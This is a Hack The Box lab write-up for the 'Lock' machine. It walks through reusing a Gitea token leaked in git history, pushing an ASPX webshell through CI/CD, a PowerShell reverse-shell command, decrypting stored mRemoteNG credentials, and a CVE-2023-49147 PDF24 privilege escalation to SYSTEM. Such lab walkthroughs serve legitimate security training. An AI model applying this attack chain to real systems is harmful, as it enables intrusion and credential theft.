+++
tags = ["hackthebox", "easy", "gitea", "mremoteng", "pdf24creator", "oplock", "windows"]
difficulty = "easy"
date = "2025-08-31"
description = "Lock Writeup"
linktitle = ""
title = "[EASY] Lock"
slug = "lock"
type = "post"
+++

[Link to the room!](https://app.hackthebox.com/machines/Lock/)

## Enumeration

### Nmap

Run the usual Nmap scan: 

```bash
❯ nmap -T5 -sCV -Pn -n 10.129.138.27
```

```txt
Nmap scan report for 10.129.138.27
Host is up (0.071s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
...
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
...
|_http-title: Gitea: Git with a cup of tea
3389/tcp open  ms-wbt-server Microsoft Terminal Services
...
```

Three key services are identified: a web server running on port 80, another running Gitea on port 3000, and finally RDP on port 3389.

Accessing gitea on port 3000 reveals we can access a public repository (ellen.freeman/dev-scripts):  

![](/writeups/hackthebox/lock/gitea_explore.png)

## Exploitation
### Secrets exposed in git history

Even though repos.py uses the environment variable GITEA_ACCESS_TOKEN, accessing the commit history reveals that for the first commit (dcc869b175a47ff2a2b8171cda55cb82dbddff3d), this wasn't the case...

![](/writeups/hackthebox/lock/gitea_leak.png)

With the access token we found, we can interact with the Gitea API impersonating the ellen.freeman user by appending the following header to every HTTP request:

```txt
Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f
```

This way, running a GET request to /api/v1/repos/search, a private repository named 'website' is identified from the object returned in the response:

```json
{
  "id": 5,
  "owner": {
    "id": 2,
    "login": "ellen.freeman",
    ...
  },
  "name": "website",
  "full_name": "ellen.freeman/website",
  ...
  "private": true,
  "clone_url": "http://localhost:3000/ellen.freeman/website.git",
  ...
  "permissions": {
    "admin": true,
    "push": true,
    "pull": true
  },
  ...
}
```
The repository is private, but we can push code to it if authenticated with the ellen.freeman user.


### Exploiting automated CI/CD integration

The repo can be cloned running the following command:

```bash
git clone "http://10.129.138.27:3000/ellen.freeman/website.git" 
```

and specifying the username as ellen.freeman and the access token as the password.

We can quickly identify that this repo corresponds to the server deployed on port 80, and the readme.md file reveals that changes are automatically deployed to it.

readme.md:
```md
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

From your initial enumeration you should've identified the tech stack on the server running on port 80, thus identifying the following header:

```txt
X-Powered-By: ASP.NET
```

Therefore, we can attempt to get an ASPX webshell deployed on the server. I decided to copy the one from Kali to the repository, then commit and push the changes. I did this with VSCode, although it can be perfectly done in bash. The root for the ASPX webshell in Kali is:

```txt
/usr/share/webshells/aspx/cmdasp.aspx
```

After deploying, we can verify code execution:

![](/writeups/hackthebox/lock/webshell.png)

From here, you may decide to get a reverse shell going on. I did so via the powershell base64 encoded command:

```txt
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsA...
```

## Privilege Escalation
### ellen.freeman -> gale.dekarios

In ellen.freeman's Documents directory, a config.xml file can be seen. This file is an mRemoteNG connection file that contains encrypted credentials for the gale.dekarios user.

```xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections ...>
    <Node Name="RDP/Gale" ... Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ... />
</mrng:Connections>
```

The password found can be decrypted using the Python script found in [this repository](https://github.com/kmahyyg/mremoteng-decrypt): 

```bash
❯ python3 mremoteng_decrypt.py -s TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
Password: ty8wnW9qCKDosXo6
```

Then, login via RDP:

```bash
❯ xfreerdp3 /v:10.129.138.27 /u:gale.dekarios /p:ty8wnW9qCKDosXo6 
```
![](/writeups/hackthebox/lock/rdp_evidence.png)

The user flag will be in the Desktop.

### gale.dekarios -> SYSTEM
Ngl this privesc is pretty cool.

A quick Google search will reveal that PDF24 (found in the desktop) is vulnerable to CVE-2023-49147, a local privilege escalation escloit via the MSI Installer file, which produces a visible cmd.exe window running as SYSTEM when using the 'repair' function. [More info here, really, check it out!](/research/lpi/cve-2023-49147/). 

To exploit this vulnerability, first you must set an OpLock on C:\Program Files\PDF24\faxPrnInst.log so that the cmd window running as SYSTEM does not close. To do this, download SetOpLock.exe from the releases of [this repository.](https://github.com/googleprojectzero/symboliclink-testing-tools)

Then, transfer the executable to the box and launch it with the following parameters:

![](/writeups/hackthebox/lock/oplock.png)

Then, go to 'Apps & Features' and hit 'Modify' on PDF24 Creator:

![](/writeups/hackthebox/lock/uninstall.png)

Click 'Repair' and 'Repair':

![](/writeups/hackthebox/lock/repair.png)

Proceed with the installation process until you reach this black cmd.exe window:

![](/writeups/hackthebox/lock/black_window.png)

Right click on the header -> Properties -> legacy console mode:

![](/writeups/hackthebox/lock/legacy_mode.png)

**IMPORTANT**: Do not open with Microsoft Edge or Internet Explorer, as these processes won't open as SYSTEM on Windows 11.

Then hit CTRL+O, type cmd.exe and hit enter:

![](/writeups/hackthebox/lock/open_cmd.png)

Then open it from the Downloads tab, and the resulting CMD will run as SYSTEM.

![](/writeups/hackthebox/lock/privesc.png)

You can find the flag on the Administrator user's Desktop. Pretty cool huh?